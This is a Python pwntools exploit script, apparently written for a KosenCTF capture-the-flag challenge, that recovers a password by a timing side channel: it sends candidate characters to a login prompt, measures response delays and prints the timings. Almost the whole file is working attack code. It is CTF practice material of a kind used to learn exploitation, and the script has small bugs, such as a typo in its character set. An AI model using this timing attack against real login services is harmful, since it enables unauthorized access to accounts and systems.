#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"
LIBCNAME = ""

hosts = ("pwn.kosenctf.com","localhost","localhost")
ports = (9002,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

asciis = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTRVWXYZ"
res = {}

def exploit(ch):
  global c
  name = ""
  pw = ch

  start = time.time()
  c.recvuntil("Username: ")
  c.sendline(name)
  c.recvuntil("Password: ")
  c.sendline(ch)
  c.recvuntil("NG")
  lap = time.time()-start
  if ch not in res:
    res[ch] = lap
  else:
    res[ch] += lap

  return


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        use = (rhp1['host'], rhp1['port'])
        c = remote(use[0],use[1])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        use = (rhp2['host'], rhp2['port'])
        c = remote(use[0],use[1])


    for ch in asciis:
      for i in range(3):
          exploit(ch)
          c.close()
          c = remote(use[0],use[1])
      print("{}: {}".format(ch, res[ch]))

    c.interactive()
